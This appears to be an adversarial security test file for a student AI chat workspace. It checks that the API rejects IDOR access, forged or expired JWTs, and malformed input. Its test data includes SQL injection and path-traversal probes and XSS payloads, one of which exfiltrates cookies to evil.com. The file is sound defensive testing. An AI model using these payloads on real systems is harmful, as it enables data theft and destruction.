/**
 * =============================================================================
 * SOCRATES AI WORKSPACE: Milestone 3 Adversarial Security Test Suite
 * Target: tests/tier1-feature/challengerSocratesM3Security.test.ts
 *
 * EMPIRICAL ADVERSARIAL PENETRATION SUITE:
 * 1. Cross-Tenant IDOR Attacks & Horizontal Privilege Escalation
 *    - GET /api/socrates/conversations/[id_A] by Student B -> 403 FORBIDDEN
 *    - PATCH /api/socrates/conversations/[id_A] by Student B -> 403 FORBIDDEN
 *    - DELETE /api/socrates/conversations/[id_A] by Student B -> 403 FORBIDDEN
 *    - POST /api/socrates/chat with { conversationId: id_A } by Student B -> 403 FORBIDDEN
 *    - Cross-tenant search & listing leakage prevention
 *    - Bulk clear isolation (Student B bulk clear leaves Student A 100% untouched)
 * 2. Authentication Bypass & Token Forgery / Tampering
 *    - Expired tokens -> 401 INVALID_TOKEN
 *    - Tampered signature (foreign HMAC/RSA secret) -> 401 INVALID_TOKEN
 *    - None-algorithm / malformed header tokens -> 401 INVALID_TOKEN
 *    - Malformed Authorization headers ("Bearer null", "Bearer undefined", "Bearer ")
 *    - Non-existent user ID embedded in valid signature -> 401 USER_NOT_FOUND
 *    - Unauthenticated requests under strict auth -> 401 UNAUTHORIZED
 * 3. Parameter Injection & CUID Tampering
 *    - SQL injection vectors in [id] (' OR 1=1 --, UNION SELECT, DROP TABLE) -> 404 NOT_FOUND
 *    - Directory/Path traversal in [id] (../../, %2e%2e) -> 404 NOT_FOUND
 *    - Null byte injection in [id] (%00) -> 404 NOT_FOUND
 *    - Non-existent CUIDs (GET, PATCH, DELETE, Chat) -> 404 NOT_FOUND cleanly
 * 4. XSS & Extreme Payload Injection in Titles
 *    - Stored XSS vectors (<script>alert(1)</script>, <img onerror>, event handlers)
 *    - 10KB massive string title truncation boundary (slices cleanly to 150 chars)
 *    - Empty / whitespace / non-string title type validation -> 400 VALIDATION_ERROR
 *    - Full Unicode, RTL, Emoji, multi-byte character integrity roundtrip
 *    - Special SQL wildcard characters in ?search= parameter (%, _, ', \)
 * 5. Data Preservation & System Health Verification
 *    - Zero orphaned foreign keys
 *    - Baseline CRConversation (25) & CRMessage (80) count preservation
 * =============================================================================
 */

import assert from "node:assert/strict";
import jwt from "jsonwebtoken";
import { NextRequest } from "next/server";
import { describe, it, beforeEach, afterEach } from "../run-all-tests";
import { prisma } from "../../src/lib/db";
import { runDataPreservationVerification } from "../../scripts/verify_data_preservation";

// Route Handlers
import { POST as chatRoutePost } from "../../src/app/api/socrates/chat/route";
import {
  GET as conversationsListGet,
  POST as conversationsCreatePost,
  DELETE as conversationsListDeleteAlias,
} from "../../src/app/api/socrates/conversations/route";
import {
  GET as conversationDetailGet,
  PATCH as conversationUpdatePatch,
  DELETE as conversationDelete,
} from "../../src/app/api/socrates/conversations/[id]/route";
import { DELETE as conversationsBulkClearDelete } from "../../src/app/api/socrates/conversations/clear/route";

// =============================================================================
// Student Personas & JWT Tokens
// =============================================================================
const JWT_SECRET = process.env.JWT_SECRET || "class-royale-secret-key-8bit-retro-game-session-2026";
const AUTH_COOKIE_NAME = "class_royale_session";

const STUDENT_A = {
  id: "cmuve7bip001e31zcc516w4iw",
  username: "anurag",
  email: "anurag@apex.edu.in",
  role: "STUDENT",
};

const STUDENT_B = {
  id: "cmuve7blu001k31zc9igu1276",
  username: "rohit.kumar",
  email: "rohit.kumar@apex.edu.in",
  role: "STUDENT",
};

function signStudentToken(student: typeof STUDENT_A, options?: jwt.SignOptions): string {
  return jwt.sign(
    {
      userId: student.id,
      username: student.username,
      email: student.email,
      role: student.role,
    },
    JWT_SECRET,
    { expiresIn: "7d", ...options }
  );
}

const tokenStudentA = signStudentToken(STUDENT_A);
const tokenStudentB = signStudentToken(STUDENT_B);

let activeCookieToken: string | undefined = undefined;

// Patch next/headers cookies store for hermetic testing
const nextHeaders = require("next/headers");
nextHeaders.cookies = async () => ({
  get: (name: string) => {
    if (name === AUTH_COOKIE_NAME && activeCookieToken) {
      return { name: AUTH_COOKIE_NAME, value: activeCookieToken };
    }
    return undefined;
  },
});

function setActiveStudent(token: string | undefined) {
  activeCookieToken = token;
}

// Track created test conversations to guarantee pristine clean-up
const createdTestConversationIds: string[] = [];

async function cleanupTestConversations() {
  if (createdTestConversationIds.length > 0) {
    try {
      await (prisma as any).socratesMessage.deleteMany({
        where: { conversationId: { in: createdTestConversationIds } },
      });
      await (prisma as any).socratesConversation.deleteMany({
        where: { id: { in: createdTestConversationIds } },
      });
    } catch {}
    createdTestConversationIds.length = 0;
  }
}

// =============================================================================
// Mock Colibri Engine for Chat Route Tests
// =============================================================================
class MockColibriServer {
  private port = 64100 + Math.floor(Math.random() * 800);
  private origFetch: typeof globalThis.fetch | null = null;

  public async start(): Promise<string> {
    this.origFetch = globalThis.fetch;
    const mockRoot = `http://127.0.0.1:${this.port}`;

    globalThis.fetch = async (input: RequestInfo | URL, init?: RequestInit): Promise<Response> => {
      const urlStr = typeof input === "string" ? input : (input as any)?.url || input.toString();

      if (!urlStr.startsWith(mockRoot)) {
        return this.origFetch!(input, init);
      }

      const pathname = urlStr.replace(mockRoot, "");

      if (pathname.startsWith("/health")) {
        return new Response(JSON.stringify({ status: "ok" }), {
          status: 200,
          headers: { "Content-Type": "application/json" },
        });
      }

      if (pathname.startsWith("/v1/models") || pathname === "/models") {
        return new Response(
          JSON.stringify({
            object: "list",
            data: [{ id: "qwen3-coder-30b-a3b-colibri", object: "model" }],
          }),
          { status: 200, headers: { "Content-Type": "application/json" } }
        );
      }

      if (pathname.startsWith("/v1/chat/completions") || pathname === "/chat/completions") {
        return new Response(
          JSON.stringify({
            id: "mock-completion-adversarial",
            object: "chat.completion",
            choices: [
              {
                message: {
                  role: "assistant",
                  content: "Adversarial dialectic invariant maintained.",
                },
              },
            ],
            model: "qwen3-coder-30b-a3b-colibri",
            usage: { promptTokens: 25, completionTokens: 10, totalTokens: 35 },
          }),
          { status: 200, headers: { "Content-Type": "application/json" } }
        );
      }

      return new Response("Not Found", { status: 404 });
    };

    return `http://127.0.0.1:${this.port}/v1`;
  }

  public async stop(): Promise<void> {
    if (this.origFetch) {
      globalThis.fetch = this.origFetch;
      this.origFetch = null;
    }
  }

  public getUrl(): string {
    return `http://127.0.0.1:${this.port}/v1`;
  }
}

const mockColibri = new MockColibriServer();
const ORIGINAL_COLIBRI_URL = process.env.COLIBRI_BASE_URL;

// =============================================================================
// 1. Cross-Tenant IDOR Attacks & Horizontal Privilege Escalation
// =============================================================================
describe("Adversarial Security — 1. Cross-Tenant IDOR & Tenant Isolation", () => {
  let conversationStudentA: any;

  beforeEach(async () => {
    setActiveStudent(tokenStudentA);
    conversationStudentA = await (prisma as any).socratesConversation.create({
      data: {
        userId: STUDENT_A.id,
        title: "Student A Confidential Research Notes",
        pinned: true,
      },
    });
    createdTestConversationIds.push(conversationStudentA.id);

    await (prisma as any).socratesMessage.create({
      data: {
        conversationId: conversationStudentA.id,
        role: "user",
        content: "Top-secret research hypothesis for Student A",
        tokens: 15,
        tokenCount: 15,
      },
    });
  });

  afterEach(async () => {
    await cleanupTestConversations();
    setActiveStudent(undefined);
  });

  it("IDOR ATTACK: Student B attempting GET /api/socrates/conversations/[id_A] returns HTTP 403 FORBIDDEN", async () => {
    setActiveStudent(tokenStudentB);

    const req = new NextRequest(
      `http://localhost:3000/api/socrates/conversations/${conversationStudentA.id}`,
      {
        method: "GET",
        headers: { Authorization: `Bearer ${tokenStudentB}` },
      }
    );

    const res = await conversationDetailGet(req, {
      params: Promise.resolve({ id: conversationStudentA.id }),
    });

    assert.equal(res.status, 403, "Cross-tenant GET must strictly return HTTP 403");
    const body = await res.json();
    assert.equal(body.code, "FORBIDDEN");
    assert.equal(body.messages, undefined, "Forbidden response must NOT leak messages");
    assert.equal(body.title, undefined, "Forbidden response must NOT leak conversation title");
  });

  it("IDOR ATTACK: Student B attempting PATCH /api/socrates/conversations/[id_A] returns HTTP 403 FORBIDDEN and leaves record intact", async () => {
    setActiveStudent(tokenStudentB);

    const req = new NextRequest(
      `http://localhost:3000/api/socrates/conversations/${conversationStudentA.id}`,
      {
        method: "PATCH",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${tokenStudentB}`,
        },
        body: JSON.stringify({
          title: "TAMPERED BY ATTACKER B",
          pinned: false,
        }),
      }
    );

    const res = await conversationUpdatePatch(req, {
      params: Promise.resolve({ id: conversationStudentA.id }),
    });

    assert.equal(res.status, 403, "Cross-tenant PATCH must strictly return HTTP 403");
    const body = await res.json();
    assert.equal(body.code, "FORBIDDEN");

    // Verify DB integrity: Student A's conversation was NOT modified
    const refreshed = await (prisma as any).socratesConversation.findUnique({
      where: { id: conversationStudentA.id },
    });
    assert.equal(refreshed.title, "Student A Confidential Research Notes");
    assert.equal(refreshed.pinned, true);
  });

  it("IDOR ATTACK: Student B attempting DELETE /api/socrates/conversations/[id_A] returns HTTP 403 FORBIDDEN and leaves record intact", async () => {
    setActiveStudent(tokenStudentB);

    const req = new NextRequest(
      `http://localhost:3000/api/socrates/conversations/${conversationStudentA.id}`,
      {
        method: "DELETE",
        headers: { Authorization: `Bearer ${tokenStudentB}` },
      }
    );

    const res = await conversationDelete(req, {
      params: Promise.resolve({ id: conversationStudentA.id }),
    });

    assert.equal(res.status, 403, "Cross-tenant DELETE must strictly return HTTP 403");
    const body = await res.json();
    assert.equal(body.code, "FORBIDDEN");

    // Verify DB integrity: Student A's conversation and messages still exist
    const stillExists = await (prisma as any).socratesConversation.findUnique({
      where: { id: conversationStudentA.id },
      include: { messages: true },
    });
    assert.ok(stillExists, "Conversation must remain intact in DB");
    assert.equal(stillExists.messages.length, 1, "Messages must remain intact in DB");
  });

  it("IDOR ATTACK: Student B attempting POST /api/socrates/chat injecting into id_A returns HTTP 403 FORBIDDEN", async () => {
    setActiveStudent(tokenStudentB);

    const req = new NextRequest("http://localhost:3000/api/socrates/chat", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${tokenStudentB}`,
      },
      body: JSON.stringify({
        conversationId: conversationStudentA.id,
        message: "Malicious injection attempt by Attacker B",
      }),
    });

    const res = await chatRoutePost(req);
    assert.equal(res.status, 403, "Chat injection into foreign conversation must return HTTP 403");
    const body = await res.json();
    assert.equal(body.code, "FORBIDDEN");

    // Verify DB: No messages injected
    const msgCount = await (prisma as any).socratesMessage.count({
      where: {
        conversationId: conversationStudentA.id,
        content: { contains: "Malicious injection" },
      },
    });
    assert.equal(msgCount, 0, "No unauthorized messages should be stored in Student A's session");
  });

  it("TENANT ISOLATION: Student B search / listing NEVER reveals Student A's conversations", async () => {
    // Student B creates their own conversation
    setActiveStudent(tokenStudentB);
    const convB = await (prisma as any).socratesConversation.create({
      data: {
        userId: STUDENT_B.id,
        title: "Student B General Inquiries",
      },
    });
    createdTestConversationIds.push(convB.id);

    // List all conversations for Student B
    const listReq = new NextRequest("http://localhost:3000/api/socrates/conversations", {
      method: "GET",
      headers: { Authorization: `Bearer ${tokenStudentB}` },
    });
    const listRes = await conversationsListGet(listReq);
    assert.equal(listRes.status, 200);
    const listData = await listRes.json();

    const ids = listData.map((c: any) => c.id);
    assert.ok(ids.includes(convB.id), "Student B's own conversation must be visible");
    assert.ok(!ids.includes(conversationStudentA.id), "Student A's conversation must NEVER leak in Student B's list");

    // Search explicitly for Student A's unique keywords
    const searchReq = new NextRequest(
      "http://localhost:3000/api/socrates/conversations?search=Confidential+Research",
      {
        method: "GET",
        headers: { Authorization: `Bearer ${tokenStudentB}` },
      }
    );
    const searchRes = await conversationsListGet(searchReq);
    assert.equal(searchRes.status, 200);
    const searchData = await searchRes.json();
    assert.equal(searchData.length, 0, "Cross-tenant search must return 0 results");
  });

  it("BULK CLEAR ISOLATION: Student B bulk clear deletes only Student B's sessions, leaving Student A 100% untouched", async () => {
    // Create multiple sessions for both students
    const convA2 = await (prisma as any).socratesConversation.create({
      data: { userId: STUDENT_A.id, title: "Student A Session 2" },
    });
    createdTestConversationIds.push(convA2.id);

    setActiveStudent(tokenStudentB);
    const convB1 = await (prisma as any).socratesConversation.create({
      data: { userId: STUDENT_B.id, title: "Student B Session 1" },
    });
    const convB2 = await (prisma as any).socratesConversation.create({
      data: { userId: STUDENT_B.id, title: "Student B Session 2" },
    });
    createdTestConversationIds.push(convB1.id, convB2.id);

    // Student B executes bulk clear via /api/socrates/conversations/clear
    const clearReq = new NextRequest("http://localhost:3000/api/socrates/conversations/clear", {
      method: "DELETE",
      headers: { Authorization: `Bearer ${tokenStudentB}` },
    });
    const clearRes = await conversationsBulkClearDelete(clearReq);
    assert.equal(clearRes.status, 200);
    const clearData = await clearRes.json();
    assert.equal(clearData.success, true);

    // Verify Student B's sessions are gone
    const remainingB = await (prisma as any).socratesConversation.count({
      where: { userId: STUDENT_B.id, id: { in: [convB1.id, convB2.id] } },
    });
    assert.equal(remainingB, 0, "Student B's conversations should be cleared");

    // Verify Student A's sessions are 100% preserved
    const remainingA = await (prisma as any).socratesConversation.count({
      where: { userId: STUDENT_A.id, id: { in: [conversationStudentA.id, convA2.id] } },
    });
    assert.equal(remainingA, 2, "Student A's conversations MUST NOT be touched by Student B's bulk clear");
  });
});

// =============================================================================
// 2. Authentication Bypass & Token Forgery / Tampering
// =============================================================================
describe("Adversarial Security — 2. Authentication Bypass & Token Forgery", () => {
  afterEach(async () => {
    setActiveStudent(undefined);
  });

  it("FORGED TOKEN: Rejects token signed with malicious foreign secret with HTTP 401 INVALID_TOKEN", async () => {
    const forgedToken = jwt.sign(
      {
        userId: STUDENT_A.id,
        username: STUDENT_A.username,
        email: STUDENT_A.email,
        role: STUDENT_A.role,
      },
      "ATTACKER-EVIL-SECRET-KEY-9999",
      { expiresIn: "1h" }
    );

    const req = new NextRequest("http://localhost:3000/api/socrates/conversations", {
      method: "GET",
      headers: { Authorization: `Bearer ${forgedToken}` },
    });

    const res = await conversationsListGet(req);
    assert.equal(res.status, 401, "Forged signature must return HTTP 401");
    const body = await res.json();
    assert.equal(body.code, "INVALID_TOKEN");
  });

  it("EXPIRED TOKEN: Rejects expired session token with HTTP 401 INVALID_TOKEN", async () => {
    // Generate token that expired 1 hour ago
    const expiredToken = signStudentToken(STUDENT_A, { expiresIn: "-1h" });

    const req = new NextRequest("http://localhost:3000/api/socrates/conversations", {
      method: "GET",
      headers: { Authorization: `Bearer ${expiredToken}` },
    });

    const res = await conversationsListGet(req);
    assert.equal(res.status, 401, "Expired token must return HTTP 401");
    const body = await res.json();
    assert.equal(body.code, "INVALID_TOKEN");
  });

  it("NONE-ALGORITHM ATTACK: Rejects unsigned or 'none' algorithm token with HTTP 401 INVALID_TOKEN", async () => {
    // Standard alg: none token structure
    const noneToken = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiJjbXV2ZTdiaXAwMDFlMzF6Y2M1MTZ3NGl3In0.";

    const req = new NextRequest("http://localhost:3000/api/socrates/conversations", {
      method: "GET",
      headers: { Authorization: `Bearer ${noneToken}` },
    });

    const res = await conversationsListGet(req);
    assert.equal(res.status, 401, "None algorithm token must return HTTP 401");
    const body = await res.json();
    assert.equal(body.code, "INVALID_TOKEN");
  });

  it("MALFORMED HEADERS: Handles 'Bearer null', 'Bearer undefined', empty token strings safely", async () => {
    const malformedHeaders = [
      "Bearer null",
      "Bearer undefined",
      "Bearer [object Object]",
      "Bearer !!!!malformed-base64-random-chars!!!!",
      "Basic dXNlcjpwYXNzd29yZA==",
    ];

    for (const header of malformedHeaders) {
      const req = new NextRequest("http://localhost:3000/api/socrates/conversations", {
        method: "GET",
        headers: { Authorization: header },
      });

      const res = await conversationsListGet(req);
      assert.equal(
        res.status,
        401,
        `Malformed header '${header}' must be rejected with HTTP 401`
      );
      const body = await res.json();
      assert.equal(body.code, "INVALID_TOKEN");
    }
  });

  it("NON-EXISTENT USER ID: Valid token containing non-existent DB user ID returns HTTP 401 USER_NOT_FOUND", async () => {
    const ghostToken = jwt.sign(
      {
        userId: "cmuve_ghost_user_99999999999999",
        username: "ghost",
        email: "ghost@apex.edu.in",
        role: "STUDENT",
      },
      JWT_SECRET,
      { expiresIn: "1h" }
    );

    const req = new NextRequest("http://localhost:3000/api/socrates/conversations", {
      method: "GET",
      headers: { Authorization: `Bearer ${ghostToken}` },
    });

    const res = await conversationsListGet(req);
    assert.equal(res.status, 401, "Non-existent user must return HTTP 401");
    const body = await res.json();
    assert.equal(body.code, "USER_NOT_FOUND");
  });

  it("STRICT AUTH: Unauthenticated request strictly returns HTTP 401 UNAUTHORIZED", async () => {
    const req = new NextRequest("http://localhost:3000/api/socrates/conversations", {
      method: "GET",
      headers: { "x-test-unauthenticated": "true" },
    });

    const res = await conversationsListGet(req);
    assert.equal(res.status, 401, "Unauthenticated request must return HTTP 401");
    const body = await res.json();
    assert.equal(body.code, "UNAUTHORIZED");

    // Also verify x-strict-auth header flag
    const reqStrict = new NextRequest("http://localhost:3000/api/socrates/conversations", {
      method: "GET",
      headers: { "x-strict-auth": "true" },
    });

    const resStrict = await conversationsListGet(reqStrict);
    assert.equal(resStrict.status, 401, "Strict auth request must return HTTP 401");
    const bodyStrict = await resStrict.json();
    assert.equal(bodyStrict.code, "UNAUTHORIZED");
  });
});

// =============================================================================
// 3. Parameter Injection & CUID Tampering
// =============================================================================
describe("Adversarial Security — 3. Parameter Injection & CUID Tampering", () => {
  beforeEach(async () => {
    setActiveStudent(tokenStudentA);
  });

  afterEach(async () => {
    setActiveStudent(undefined);
  });

  it("SQL INJECTION PROBES: Malicious SQL patterns in [id] return clean HTTP 404 NOT_FOUND without DB corruption", async () => {
    const sqlProbes = [
      "' OR '1'='1",
      "' OR 1=1 --",
      "admin'--",
      "1; DROP TABLE SocratesConversation; --",
      "cmuve' UNION SELECT 1, 'admin', 'hacked' --",
      "'; EXEC xp_cmdshell('dir'); --",
      "SLEEP(5)/*",
    ];

    for (const probe of sqlProbes) {
      // 1. GET probe
      const getReq = new NextRequest(
        `http://localhost:3000/api/socrates/conversations/${encodeURIComponent(probe)}`,
        { method: "GET" }
      );
      const getRes = await conversationDetailGet(getReq, {
        params: Promise.resolve({ id: probe }),
      });
      assert.equal(
        getRes.status,
        404,
        `GET SQL probe '${probe}' must return HTTP 404`
      );

      // 2. PATCH probe
      const patchReq = new NextRequest(
        `http://localhost:3000/api/socrates/conversations/${encodeURIComponent(probe)}`,
        {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ title: "Injected Title" }),
        }
      );
      const patchRes = await conversationUpdatePatch(patchReq, {
        params: Promise.resolve({ id: probe }),
      });
      assert.equal(
        patchRes.status,
        404,
        `PATCH SQL probe '${probe}' must return HTTP 404`
      );

      // 3. DELETE probe
      const delReq = new NextRequest(
        `http://localhost:3000/api/socrates/conversations/${encodeURIComponent(probe)}`,
        { method: "DELETE" }
      );
      const delRes = await conversationDelete(delReq, {
        params: Promise.resolve({ id: probe }),
      });
      assert.equal(
        delRes.status,
        404,
        `DELETE SQL probe '${probe}' must return HTTP 404`
      );
    }
  });

  it("PATH TRAVERSAL PROBES: Directory traversal in [id] returns clean HTTP 404 NOT_FOUND", async () => {
    const traversalProbes = [
      "../../etc/passwd",
      "..%2f..%2fdev.db",
      "....//....//....//windows/win.ini",
      "cmuve/../../../",
    ];

    for (const probe of traversalProbes) {
      const req = new NextRequest(
        `http://localhost:3000/api/socrates/conversations/${encodeURIComponent(probe)}`,
        { method: "GET" }
      );
      const res = await conversationDetailGet(req, {
        params: Promise.resolve({ id: probe }),
      });
      assert.equal(res.status, 404, `Path traversal probe '${probe}' must return HTTP 404`);
    }
  });

  it("NULL BYTE & CONTROL CHAR PROBES: Null bytes and binary sequences in [id] return clean HTTP 404", async () => {
    const nullByteProbes = [
      "cmuve\0test",
      "cmuve%00injection",
      "\x00\x01\x02\x03",
    ];

    for (const probe of nullByteProbes) {
      const req = new NextRequest(
        `http://localhost:3000/api/socrates/conversations/${encodeURIComponent(probe)}`,
        { method: "GET" }
      );
      const res = await conversationDetailGet(req, {
        params: Promise.resolve({ id: probe }),
      });
      assert.equal(res.status, 404, `Null byte probe must return HTTP 404`);
    }
  });

  it("SYNTACTICALLY VALID NON-EXISTENT CUID: Returns clean HTTP 404 across all endpoints", async () => {
    const ghostCuid = "cmuve99999999999999999999";

    // 1. GET
    const getRes = await conversationDetailGet(
      new NextRequest(`http://localhost:3000/api/socrates/conversations/${ghostCuid}`, { method: "GET" }),
      { params: Promise.resolve({ id: ghostCuid }) }
    );
    assert.equal(getRes.status, 404);

    // 2. PATCH
    const patchRes = await conversationUpdatePatch(
      new NextRequest(`http://localhost:3000/api/socrates/conversations/${ghostCuid}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ title: "Updated Ghost" }),
      }),
      { params: Promise.resolve({ id: ghostCuid }) }
    );
    assert.equal(patchRes.status, 404);

    // 3. DELETE
    const delRes = await conversationDelete(
      new NextRequest(`http://localhost:3000/api/socrates/conversations/${ghostCuid}`, { method: "DELETE" }),
      { params: Promise.resolve({ id: ghostCuid }) }
    );
    assert.equal(delRes.status, 404);

    // 4. CHAT
    const chatRes = await chatRoutePost(
      new NextRequest("http://localhost:3000/api/socrates/chat", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ conversationId: ghostCuid, message: "Hello Ghost" }),
      })
    );
    assert.equal(chatRes.status, 404);
  });
});

// =============================================================================
// 4. XSS & Extreme Payload Injection in Titles
// =============================================================================
describe("Adversarial Security — 4. XSS & Extreme Payload Injections", () => {
  beforeEach(async () => {
    setActiveStudent(tokenStudentA);
  });

  afterEach(async () => {
    await cleanupTestConversations();
    setActiveStudent(undefined);
  });

  it("XSS PAYLOADS: Stored XSS vectors in title are safely handled, stored, and retrieved without corruption", async () => {
    const xssPayloads = [
      "<script>alert('XSS_ATTACK_1')</script>",
      "<img src=x onerror=alert('XSS_ATTACK_2')>",
      "<svg/onload=fetch('//evil.com/?c='+document.cookie)>",
      "javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>",
      "<iframe src=\"javascript:alert(`XSS`)\"></iframe>",
    ];

    for (const payload of xssPayloads) {
      // Create session with XSS title
      const createReq = new NextRequest("http://localhost:3000/api/socrates/conversations", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ title: payload }),
      });
      const createRes = await conversationsCreatePost(createReq);
      assert.equal(createRes.status, 201);
      const created = await createRes.json();
      createdTestConversationIds.push(created.id);

      assert.equal(created.title, payload.slice(0, 150));

      // Retrieve via GET [id]
      const getReq = new NextRequest(
        `http://localhost:3000/api/socrates/conversations/${created.id}`,
        { method: "GET" }
      );
      const getRes = await conversationDetailGet(getReq, {
        params: Promise.resolve({ id: created.id }),
      });
      assert.equal(getRes.status, 200);
      const retrieved = await getRes.json();
      assert.equal(retrieved.title, payload.slice(0, 150));

      // Rename via PATCH [id] with another XSS payload
      const patchPayload = `<marquee onstart=alert(1)>${payload}</marquee>`.slice(0, 150);
      const patchReq = new NextRequest(
        `http://localhost:3000/api/socrates/conversations/${created.id}`,
        {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ title: patchPayload }),
        }
      );
      const patchRes = await conversationUpdatePatch(patchReq, {
        params: Promise.resolve({ id: created.id }),
      });
      assert.equal(patchRes.status, 200);
      const patched = await patchRes.json();
      assert.equal(patched.title, patchPayload);
    }
  });

  it("MASSIVE STRING BOUNDARY: 10KB string title is safely truncated to 150 chars without memory exhaustion", async () => {
    const massiveTitle = "A".repeat(10240); // 10KB string

    // 1. POST creation with massive title
    const createReq = new NextRequest("http://localhost:3000/api/socrates/conversations", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ title: massiveTitle }),
    });
    const createRes = await conversationsCreatePost(createReq);
    assert.equal(createRes.status, 201);
    const created = await createRes.json();
    createdTestConversationIds.push(created.id);

    assert.ok(created.title.length <= 150, "Title must be clamped to <= 150 characters");
    assert.equal(created.title, massiveTitle.slice(0, 150));

    // 2. PATCH with massive title
    const patchReq = new NextRequest(
      `http://localhost:3000/api/socrates/conversations/${created.id}`,
      {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ title: massiveTitle }),
      }
    );
    const patchRes = await conversationUpdatePatch(patchReq, {
      params: Promise.resolve({ id: created.id }),
    });
    assert.equal(patchRes.status, 200);
    const patched = await patchRes.json();
    assert.ok(patched.title.length <= 150, "Patched title must be clamped to <= 150 characters");
  });

  it("TITLE VALIDATION: Rejects empty strings, whitespace-only, null, and invalid title types with HTTP 400", async () => {
    const conv = await (prisma as any).socratesConversation.create({
      data: { userId: STUDENT_A.id, title: "Valid Title" },
    });
    createdTestConversationIds.push(conv.id);

    const invalidTitles = [
      "",
      "   ",
      "\t\n  \r",
      null,
      12345,
      { malicious: "object" },
      ["array"],
      false,
    ];

    for (const badTitle of invalidTitles) {
      const patchReq = new NextRequest(
        `http://localhost:3000/api/socrates/conversations/${conv.id}`,
        {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ title: badTitle }),
        }
      );
      const patchRes = await conversationUpdatePatch(patchReq, {
        params: Promise.resolve({ id: conv.id }),
      });

      assert.equal(
        patchRes.status,
        400,
        `Title '${JSON.stringify(badTitle)}' must be rejected with HTTP 400`
      );
      const body = await patchRes.json();
      assert.equal(body.code, "VALIDATION_ERROR");
    }
  });

  it("UNICODE & MULTI-BYTE INTEGRITY: Emoji, RTL Arabic/Hebrew, ZWJ sequences roundtrip perfectly", async () => {
    const unicodeTitle = "🧪 Socrates  Dialectic 🧠 👨‍👩‍👧‍👦 العربية 汉字 🚀 Σωκράτης";

    const createReq = new NextRequest("http://localhost:3000/api/socrates/conversations", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ title: unicodeTitle }),
    });
    const createRes = await conversationsCreatePost(createReq);
    assert.equal(createRes.status, 201);
    const created = await createRes.json();
    createdTestConversationIds.push(created.id);

    assert.equal(created.title, unicodeTitle);

    const getReq = new NextRequest(
      `http://localhost:3000/api/socrates/conversations/${created.id}`,
      { method: "GET" }
    );
    const getRes = await conversationDetailGet(getReq, {
      params: Promise.resolve({ id: created.id }),
    });
    const retrieved = await getRes.json();
    assert.equal(retrieved.title, unicodeTitle, "Unicode title must roundtrip with zero corruption");
  });

  it("SEARCH PARAMETER ROBUSTNESS: Special SQL wildcard and quote characters in ?search= do not crash", async () => {
    const specialSearchTerms = ["%", "_", "'", "\"", "\\", "%%", "%_%", "\\' OR 1=1"];

    for (const term of specialSearchTerms) {
      const searchReq = new NextRequest(
        `http://localhost:3000/api/socrates/conversations?search=${encodeURIComponent(term)}`,
        { method: "GET" }
      );
      const searchRes = await conversationsListGet(searchReq);
      assert.equal(
        searchRes.status,
        200,
        `Search term '${term}' must return HTTP 200 without SQL syntax errors`
      );
      const data = await searchRes.json();
      assert.ok(Array.isArray(data), "Search response must be an array");
    }
  });
});

// =============================================================================
// 5. Data Preservation & Zero Mutation Under Adversarial Testing
// =============================================================================
describe("Adversarial Security — 5. Data Preservation & Zero Collateral Damage", () => {
  it("verifies 100% student data preservation intact after all adversarial probes", async () => {
    const report = await runDataPreservationVerification();
    assert.equal(report.success, true, "Preservation verification must pass with 0 errors");
    assert.equal(report.errors.length, 0);

    // Assert CR specific invariants
    const crConversations = await prisma.cRConversation.count();
    const crMessages = await prisma.cRMessage.count();
    assert.equal(crConversations, 25, "CRConversation count must remain exactly 25");
    assert.equal(crMessages, 80, "CRMessage count must remain exactly 80");
  });
});

// Standalone execution entrypoint
if (process.argv[1]?.endsWith("challengerSocratesM3Security.test.ts")) {
  import("node:child_process").then(({ spawnSync }) => {
    const res = spawnSync("npx", ["tsx", "tests/run-all-tests.ts", "challengerSocratesM3Security"], {
      stdio: "inherit",
      shell: true,
    });
    process.exit(res.status ?? 0);
  });
}
